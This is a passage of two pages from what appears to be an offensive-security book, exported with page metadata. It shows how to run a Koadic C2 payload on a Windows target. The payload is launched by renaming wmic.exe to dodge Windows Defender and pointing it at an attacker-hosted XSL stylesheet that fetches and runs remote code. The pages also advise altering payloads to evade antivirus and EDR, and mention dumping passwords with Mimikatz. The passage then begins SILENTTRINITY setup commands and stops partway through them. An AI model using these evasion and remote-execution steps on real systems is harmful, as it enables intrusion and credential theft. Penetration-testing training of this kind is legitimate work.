  img_proc: true
- pgno: 36
  md: 'However, the preceding trigger command is easily caught by Windows Defender,
    so we have to tweak it a bit—for instance, by renaming wmic.exe to something innocuous
    like dolly.exe, as shown next. Depending on the Windows version of the victim
    machine, you may also need to alter the style sheet produced by Koadic to evade
    detection. Again, simple string replacement should do it (so much for machine
    learning in the AV world):


    ```

    # Executing the payload on the target machine


    C:\Temp> copy C:\Windows\System32\wbem\wmic.exe dolly.exe

    C:\Temp> dolly.exe os get /FORMAT:http://192.168.1.25:9996/ArQx0.xsl

    ```


    Koadic refers to target machines as “zombies.” When we check for a zombie on our
    server, we should see details of the target machine:


    ```

    # Our server


    (koadic: sta/js/mshta)$ zombies


    [+] Zombie 1: PIANO\wk_admin* @ PIANO -- Windows 10 Pro

    ```


    We refer to a zombie by its ID to get its basic system information:


    ```

    (koadic: sta/js/mshta)$ zombies 1

    ID:                1

    Status:            Alive

    IP:                 192.168.1.30

    User:               PIANO\wk_admin*

    Hostname:           PIANO

    --snip--

    ```


    Next, we can choose any of the available implants with the command use implant/,
    from dumping passwords with Mimikatz to pivoting to other machines. If you’re
    familiar with Empire, then you will feel right at home with Koadic.


    The only caveat is that, as with most current Windows C2 frameworks, you should
    customize and sanitize all payloads carefully before deploying them in the field.
    Open source C2 frameworks are just that: frameworks. They take care of the boring
    stuff like agent communication and encryption and provide extensible plug-ins
    and code templates, but every native exploit or execution technique they ship
    is likely tainted and should be surgically changed to evade antivirus and endpoint
    detection and response (EDR) solutions.


    > **NOTE** Shout out to Covenant C2 (http://bit.ly/2TUqPcH) for its outstanding
    ease of customization. The C# payload of every module can be tweaked right from
    the web UI before being shipped to the target.


    For this sanitization, sometimes a crude string replacement will do; other times,
    we need to recompile the code or snip out some bits. Do not expect any of these
    frameworks to flawlessly work from scratch on a brand-new and hardened Windows
    10 system. Take the time to investigate the execution technique and make it fit
    your own narrative.'
  merge: -1
  img_proc: true
- pgno: 37
  md: '# SILENTTRINITY


    The last C2 framework I would like to cover is my personal favorite: SILENTTRINITY
    (https://github.com/bytb3l33d3r/SILENTTRINITY). It takes such an original approach
    that I think you should momentarily pause reading this book and go watch Marcello
    Salvati’s talk “IronPython . . . OMFG” about the .NET environment on YouTube.


    To sum it up somewhat crudely, PowerShell and C# code produce intermediary assembly
    code to be executed by the .NET framework. Yet, there are many other languages
    that can do the same job: F#, IronPython, . . . and Boo-Lang! Yes, it is a real
    language; look it up. It’s as if a Python lover and a Microsoft fanatic were locked
    in a cell and forced to cooperate with each other to save humanity from impending
    Hollywoodian doom.


    While every security vendor is busy looking for PowerShell scripts and weird command
    lines, SILENTTRINITY is peacefully gliding over the clouds using Boo-Lang to interact
    with Windows internal services and dropping perfectly safe-looking evil bombshells.


    The tool’s serverside requires Python 3.7, so make sure to have Python properly
    working before installing it; then proceed to download and launch the SILENTTRINITY
    team server:


    ```

    # Terminal 1

    root@Lab:~/# git clone https://github.com/bytb3l33d3r/SILENTTRINITY

    root@Lab:~/# cd SILENTTRINITY

    root@Lab:ST/# python3.7 -m pip install setuptools

